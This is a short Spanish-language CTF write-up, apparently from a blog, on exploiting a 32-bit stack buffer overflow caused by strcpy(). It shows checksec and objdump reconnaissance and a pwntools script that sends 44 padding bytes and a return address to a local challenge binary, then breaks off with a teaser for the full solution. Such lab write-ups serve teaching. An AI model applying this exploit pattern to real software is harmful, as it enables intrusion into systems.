---
title: "CTF Challenge Writeup: Buffer Overflow"
description: "Solución paso a paso de un desafío CTF de buffer overflow en binarios de 32 bits"
date: "2026-03-05"
image: "https://via.placeholder.com/240x160?text=CTF+Writeup"
category: "Writeups"
---

# CTF Writeup: Buffer Overflow [DIFFICULTY: HARD]

En este writeup, te mostraré cómo resolver un desafío CTF de buffer overflow de forma práctica.

## Reconnaissance

Primero, analizamos el binario:

```bash
file challenge
# Output: ELF 32-bit LSB executable, Intel 80386

checksec challenge
# Arch:     i386-32-bit
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
```

## Vulnerability Analysis

```bash
objdump -d challenge | grep -A 20 "main"
```

Encontramos una función vulnerable con `strcpy()` que no valida el tamaño.

## Exploitation

Creamos el payload:

```python
from pwn import *

offset = 44  # Encontrado con cyclic
target = 0x08048080  # Dirección de la función objetivo

payload = b'A' * offset
payload += p32(target)

p = process('./challenge')
p.send(payload)
p.interactive()
```

Continúa para ver la solución completa...
